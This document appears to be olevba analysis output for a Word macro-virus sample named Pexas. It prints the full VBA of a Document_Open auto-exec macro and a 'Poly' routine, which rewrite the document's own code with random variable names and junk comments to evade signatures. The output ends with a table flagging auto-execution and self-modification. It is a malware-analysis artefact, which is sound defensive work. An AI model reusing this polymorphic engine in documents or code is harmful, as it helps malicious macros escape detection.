olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas-d88f343959827a4351441367bb6af8442066364e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas-d88f343959827a4351441367bb6af8442066364e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Open()
On Error Resume Next 'vlE
If ThisDocument.FullName <> Templates(1).FullName Then 'QTJ
YTMMp = 8 '�9O
ReDim YRMMp(1 To YTMMp) As String 'pf%
YRMMp(1) = "YTMMp": YRMMp(2) = "CNEMp": YRMMp(3) = "YRMMp": YRMMp(4) = "VILMp" 'v\Š
YRMMp(5) = "VHHMp": YRMMp(6) = "UXAMp": YRMMp(7) = "MGBMp": YRMMp(8) = "VYEMp" '’€–
Set MGBMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'SgC
'modif var.'a—X
For UXAMp = 1 To YTMMp ';E:
Randomize 'Vb}
VHHMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'ua€
For CNEMp = 2 To MGBMp.CountOfLines 'pJŽ
VYEMp = MGBMp.Lines(CNEMp, 1) '%+‰
If InStr(1, VYEMp, YRMMp(UXAMp), vbTextCompare) Then '3*Ź
VYEMp = Replace(VYEMp, YRMMp(UXAMp), VHHMp, 1, -1, vbTextCompare) 'w~‘
MGBMp.ReplaceLine CNEMp, VYEMp 'W,
End If ']BB
Next CNEMp '{cS
Next UXAMp '>”Ś
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe'zW%
For UXAMp = 2 To MGBMp.CountOfLines '�h’
VYEMp = MGBMp.Lines(UXAMp, 1) 'n•q
If Len(VYEMp) <= 100 Then 'sz’
VYEMp = VYEMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
MGBMp.ReplaceLine UXAMp, VYEMp '7.…
End If '†=•
Next UXAMp 'YdY
End If 'Q%]
End Sub '’B{
-------------------------------------------------------------------------------
VBA MACRO Gen0.bas 
in file: Virus.MSWord.Pexas-d88f343959827a4351441367bb6af8442066364e - OLE stream: 'Macros/VBA/Gen0'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Poly()
On Error Resume Next
If ThisDocument.FullName <> Templates(1).FullName Then
nr = 8
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "myRange"
suk(5) = "strip": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
Set char1 = ActiveDocument.VBProject.VBComponents(1).CodeModule
'modif var.
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp"
For bkup = 2 To char1.CountOfLines
nam1 = char1.Lines(bkup, 1)
If InStr(1, nam1, suk(ik), vbTextCompare) Then
nam1 = Replace(nam1, suk(ik), strip, 1, -1, vbTextCompare)
char1.ReplaceLine bkup, nam1
End If
Next bkup
Next ik
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe
For ik = 2 To char1.CountOfLines
nam1 = char1.Lines(ik, 1)
If Len(nam1) <= 100 Then
nam1 = nam1 + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
char1.ReplaceLine ik, nam1
End If
Next ik
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
